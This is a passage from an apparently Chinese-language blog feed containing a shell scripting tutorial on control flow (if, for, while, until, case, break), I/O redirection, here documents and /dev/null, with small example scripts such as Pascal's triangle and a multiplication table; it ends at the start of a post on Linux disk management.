<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e ./notFile -o -e ./bash</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;至少有一个文件存在!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个文件都不存在&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">至少有一个文件存在!</span><br></pre></td></tr></table></figure>
<h3 id="Shell-流程控制">Shell 流程控制</h3>
<h4 id="if-else判断语句">if else判断语句</h4>
<p>if 语句语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>写成一行（适用于终端命令提示符）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ $(ps -ef | grep -c <span class="string">&quot;ssh&quot;</span>) -gt 1 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;true&quot;</span>; <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if else 语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if else-if else 语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1</span><br><span class="line"><span class="keyword">elif</span> condition2 </span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    command2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>以下实例判断两个变量是否相等：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> == <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$a</span> -gt <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 大于 b&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 小于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;没有符合的条件&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> 小于 <span class="selector-tag">b</span></span><br></pre></td></tr></table></figure>
<p>if else语句经常与test命令结合使用，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num1=$[2*3]</span><br><span class="line">num2=$[1+5]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $[num1] -eq $[num2]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数字相等!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数字不相等!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">两个数字相等!</span><br></pre></td></tr></table></figure>
<h4 id="for循环">for循环</h4>
<p>for循环一般格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>写成一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN; <span class="keyword">do</span> command1; command2… <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>
<p>例如，顺序输出当前列表中的数字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> loop <span class="keyword">in</span> 1 2 3 4 5</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;The value is: <span class="variable">$loop</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The value is: 1</span><br><span class="line">The value is: 2</span><br><span class="line">The value is: 3</span><br><span class="line">The value is: 4</span><br><span class="line">The value is: 5</span><br></pre></td></tr></table></figure>
<p>顺序输出字符串中的字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> str <span class="keyword">in</span> <span class="string">&#x27;This is a string&#x27;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$str</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">This is a string</span><br></pre></td></tr></table></figure>
<h4 id="while循环">while循环</h4>
<p>while循环格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>(( <span class="variable">$int</span>&lt;=<span class="number">5</span> ))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">    <span class="built_in">let</span> <span class="string">&quot;int++&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>运行脚本，输出：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>while循环可用于读取键盘信息。下面的例子中，输入信息被设置为变量FILM，按<code>Ctrl-D</code>结束循环。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;按下 &lt;CTRL-D&gt; 退出&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;输入你最喜欢的网站名: &#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> FILM</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;是的！<span class="variable">$FILM</span> 是一个好网站&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>运行脚本，输出类似下面：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">按下 <span class="tag">&lt;<span class="name">CTRL-D</span>&gt;</span> 退出</span><br><span class="line">输入你最喜欢的网站名:淘宝</span><br><span class="line">是的！淘宝 是一个好网站</span><br></pre></td></tr></table></figure>
<h4 id="无限循环">无限循环</h4>
<p>无限循环语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (( ; ; ))</span><br></pre></td></tr></table></figure>
<h4 id="until-循环">until 循环</h4>
<p>until 循环执行一系列命令直至条件为 true 时停止。</p>
<p>until 循环与 while 循环在处理方式上刚好相反。</p>
<p>一般 while 循环优于 until 循环，但在某些时候—也只是极少数情况下，until 循环更加有用。</p>
<p>until 语法格式:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">until</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>condition 一般为条件表达式，如果返回值为 false，则继续执行循环体内的语句，否则跳出循环。</p>
<p>以下实例我们使用 until 命令来输出 0 ~ 9 的数字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">until</span> [ ! <span class="variable">$a</span> -lt 10 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">   a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p>输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
<h4 id="case">case</h4>
<p>Shell case语句为多选择语句。可以用case语句匹配一个值与一个模式，如果匹配成功，执行相匹配的命令。case语句格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> 值 <span class="keyword">in</span></span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p>下面的脚本提示输入1到4，与每一种模式进行匹配：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;输入 1 到 4 之间的数字:&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;你输入的数字为:&#x27;</span></span><br><span class="line"><span class="built_in">read</span> aNum</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">    1)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 1&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    2)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 2&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    3)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 3&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    4)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 4&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    *)  <span class="built_in">echo</span> <span class="string">&#x27;你没有输入 1 到 4 之间的数字&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p>输入不同的内容，会有不同的结果，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入 1 到 4 之间的数字:</span><br><span class="line">你输入的数字为:</span><br><span class="line">3</span><br><span class="line">你选择了 3</span><br></pre></td></tr></table></figure>
<h4 id="跳出循环">跳出循环</h4>
<p>在循环过程中，有时候需要在未达到循环结束条件时强制跳出循环，Shell使用两个命令来实现该功能：break和continue。</p>
<p>break命令允许跳出所有循环（终止执行后面的所有循环）。</p>
<p>下面的例子中，脚本进入死循环直至用户输入数字大于5。要跳出这个循环，返回到shell提示符下，需要使用break命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;输入 1 到 5 之间的数字:&quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">        1|2|3|4|5) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字为 <span class="variable">$aNum</span>!&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>执行以上代码，输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入 1 到 5 之间的数字:3</span><br><span class="line">你输入的数字为 3!</span><br><span class="line">输入 1 到 5 之间的数字:7</span><br><span class="line">你输入的数字不是 1 到 5 之间的! 游戏结束</span><br></pre></td></tr></table></figure>
<p>continue命令与break命令类似，只有一点差别，它不会跳出所有循环，仅仅跳出当前循环。</p>
<h3 id="Shell输入-输出重定向">Shell输入/输出重定向</h3>
<p>重定向命令列表如下：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>command &gt; file</td>
<td>将输出重定向到 file。</td>
</tr>
<tr>
<td>command &lt; file</td>
<td>将输入重定向到 file。</td>
</tr>
<tr>
<td>command &gt;&gt; file</td>
<td>将输出以追加的方式重定向到 file。</td>
</tr>
<tr>
<td>n &gt; file</td>
<td>将文件描述符为 n 的文件重定向到 file。</td>
</tr>
<tr>
<td>n &gt;&gt; file</td>
<td>将文件描述符为 n 的文件以追加的方式重定向到 file。</td>
</tr>
<tr>
<td>n &gt;&amp; m</td>
<td>将输出文件 m 和 n 合并。</td>
</tr>
<tr>
<td>n &lt;&amp; m</td>
<td>将输入文件 m 和 n 合并。</td>
</tr>
<tr>
<td>&lt;&lt; tag</td>
<td>将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td>
</tr>
</tbody>
</table>
<blockquote>
<p>需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</p>
</blockquote>
<hr>
<h4 id="输出重定向">输出重定向</h4>
<p>重定向一般通过在命令间插入特定的符号来实现。特别的，这些符号的语法如下所示:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &gt; file1</span><br></pre></td></tr></table></figure>
<p>上面这个命令执行command1然后将输出的内容存入file1。</p>
<p>注意任何file1内的已经存在的内容将被新内容替代。如果要将新内容添加在文件末尾，请使用&gt;&gt;操作符。</p>
<p>输出重定向会覆盖文件内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;www.baidu.com&quot;</span> &gt; <span class="built_in">users</span></span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">users</span></span><br><span class="line">www.baidu.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>如果不希望文件内容被覆盖，可以使用 &gt;&gt; 追加到文件末尾，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;www.baidu.com&quot;</span> &gt;&gt; <span class="built_in">users</span></span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">users</span></span><br><span class="line">www.baidu.com</span><br><span class="line">www.baidu.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h4 id="输入重定向">输入重定向</h4>
<p>和输出重定向一样，Unix 命令也可以从文件获取输入，语法为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &lt; file1</span><br></pre></td></tr></table></figure>
<p>这样，本来需要从键盘获取输入的命令会转移到文件读取内容。</p>
<p>注意：输出重定向是大于号(&gt;)，输入重定向是小于号(&lt;)。</p>
<p>统计 users 文件的行数,执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">wc</span> -l <span class="built_in">test</span> </span><br><span class="line">4 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>也可以将输入重定向到 users 文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">wc</span> -l &lt;<span class="built_in">test</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>
<p>注意：上面两个例子的结果不同：第一个例子，会输出文件名；第二个不会，因为它仅仅知道从标准输入读取内容。</p>
<p>同时替换输入和输出，执行command1，从文件infile读取内容，然后将输出写入到outfile中:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &lt; infile &gt; outfile</span><br></pre></td></tr></table></figure>
<h4 id="重定向深入讲解">重定向深入讲解</h4>
<p>一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。</p>
</li>
<li class="lvl-2">
<p>标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。</p>
</li>
<li class="lvl-2">
<p>标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。</p>
</li>
</ul>
<p>默认情况下，command &gt; file 将 stdout 重定向到 file，command &lt; file 将stdin 重定向到 file。</p>
<p>如果希望 stderr 重定向到 file，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> 2 &gt; file</span><br></pre></td></tr></table></figure>
<p>如果希望 stderr 追加到 file 文件末尾，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> 2 &gt;&gt; file</span><br></pre></td></tr></table></figure>
<p><strong>2</strong> 表示标准错误文件(stderr)。</p>
<p>如果希望将 stdout 和 stderr 合并后重定向到 file，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; file 2&gt;&amp;1</span><br><span class="line">或者</span><br><span class="line">$ <span class="built_in">command</span> &gt;&gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>如果希望对 stdin 和 stdout 都重定向，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &lt; file1 &gt;file2</span><br></pre></td></tr></table></figure>
<p>command 命令将 stdin 重定向到 file1，将 stdout 重定向到 file2。</p>
<h4 id="Here-Document">Here Document</h4>
<p>Here Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序。</p>
<p>它的基本的形式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> &lt;&lt; <span class="string">delimiter</span></span><br><span class="line"><span class="string">    document</span></span><br><span class="line"><span class="string">delimiter</span></span><br></pre></td></tr></table></figure>
<p>它的作用是将两个 delimiter 之间的内容(document) 作为输入传递给 command。</p>
<p>注意：结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进。</p>
<p>在命令行中通过 wc -l 命令计算 Here Document 的行数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">wc</span> -l &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">    欢迎来到</span></span><br><span class="line"><span class="string">    菜鸟教程</span></span><br><span class="line"><span class="string">    www.runoob.com</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">3          <span class="comment"># 输出结果为 3 行</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h4 id="dev-null-文件">/dev/null 文件</h4>
<p>如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; /dev/null</span><br></pre></td></tr></table></figure>
<p>/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到&quot;禁止输出&quot;的效果。</p>
<p>如果希望屏蔽 stdout 和 stderr，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>0 是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</p>
<h3 id="实例">实例</h3>
<h4 id="杨辉三角：">杨辉三角：</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">test</span> -z <span class="variable">$1</span>) ;<span class="keyword">then</span> </span><br><span class="line"> <span class="built_in">read</span> -p <span class="string">&quot;Input high Int Lines:&quot;</span> high </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"> high=<span class="variable">$1</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">test</span> -z <span class="variable">$2</span>) ;<span class="keyword">then</span> </span><br><span class="line"> space=4</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"> space=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">printspace</span></span>()&#123;</span><br><span class="line">  <span class="comment">#空位填充</span></span><br><span class="line">  <span class="keyword">for</span>((z=<span class="number">1</span>;z&lt;=<span class="variable">$1</span>;z++));<span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot; &quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a[0]=1     </span><br><span class="line"><span class="keyword">for</span>((i=<span class="number">0</span>;i&lt;=high;i++));<span class="keyword">do</span></span><br><span class="line">  <span class="comment">#产生当前列数据数组</span></span><br><span class="line">  <span class="keyword">for</span> ((j=<span class="variable">$i</span>;j&gt;<span class="number">0</span>;j--));<span class="keyword">do</span> </span><br><span class="line">    ((a[<span class="variable">$j</span>]+=a[<span class="variable">$j</span>-<span class="number">1</span>])) </span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  printspace $(((<span class="variable">$high</span>-<span class="variable">$i</span>)*<span class="variable">$space</span>/<span class="number">2</span>))</span><br><span class="line">  <span class="keyword">for</span> ((j=<span class="number">0</span>;j&lt;=<span class="variable">$i</span>;j++));<span class="keyword">do</span></span><br><span class="line">    num=$((<span class="variable">$space</span>-<span class="variable">$&#123;#a[$j]&#125;</span>))</span><br><span class="line">    printspace $((<span class="variable">$num</span>/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">echo</span> -n <span class="variable">$&#123;a[$j]&#125;</span></span><br><span class="line">    printspace $((<span class="variable">$num</span>-<span class="variable">$num</span>/<span class="number">2</span>))</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h4 id="sum-max">sum()&amp;max():</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;shell的函数返回值只能为0~255的整数，高位自动丢弃&quot;</span></span><br><span class="line"><span class="function"><span class="title">sum</span></span>()&#123;</span><br><span class="line"> <span class="built_in">sum</span>=0</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span></span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$i</span> -ne <span class="variable">$1</span>;<span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> -n <span class="string">&quot;+&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="built_in">sum</span>=$((<span class="variable">$sum</span>+<span class="variable">$i</span>))</span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;=<span class="variable">$sum</span>&quot;</span></span><br><span class="line"> <span class="built_in">return</span> $((<span class="variable">$sum</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sum</span> <span class="variable">$@</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;‘sum()’函数返回值：&quot;</span>$?</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">max</span></span>()&#123;</span><br><span class="line"> max=0</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>;<span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$i</span> -ge <span class="variable">$max</span>;<span class="keyword">then</span></span><br><span class="line">    max=<span class="variable">$i</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;参数最大值：<span class="variable">$max</span>&quot;</span></span><br><span class="line"> <span class="built_in">return</span> $((<span class="variable">$max</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">max <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;‘max()’函数返回值：&quot;</span>$?</span><br></pre></td></tr></table></figure>
<h4 id="99乘法表：">99乘法表：</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..9&#125;;<span class="keyword">do</span></span><br><span class="line"> <span class="keyword">for</span>((j=<span class="number">1</span>;j&lt;=i;j++));<span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -en <span class="string">&quot;<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="subst">$(($i*$j)</span>)\t&quot;</span></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> &#123;1..9&#125;;<span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> &#123;0..9&#125;;<span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> &#123;0..9&#125;;<span class="keyword">do</span></span><br><span class="line">            number1=$((a*<span class="number">100</span>+b*<span class="number">10</span>+c))</span><br><span class="line">            number2=$((a**<span class="number">3</span>+b**<span class="number">3</span>+c**<span class="number">3</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$number1</span> -eq <span class="variable">$number2</span>; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Found number <span class="variable">$number1</span>&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】磁盘管理</title>
    <url>/posts/bdf9e69e/</url>
    <content><![CDATA[<span id="more"></span>
<h3 id="Linux-磁盘管理">Linux 磁盘管理</h3>
<p>Linux磁盘管理常用三个命令为df、du和fdisk。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>df：列出文件系统的整体磁盘使用量</p>
</li>
<li class="lvl-2">
<p>du：检查磁盘空间使用量</p>
</li>
<li class="lvl-2">
<p>fdisk：用于磁盘分区</p>
</li>
</ul>
<hr>
<h4 id="df">df</h4>
<p>获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p>
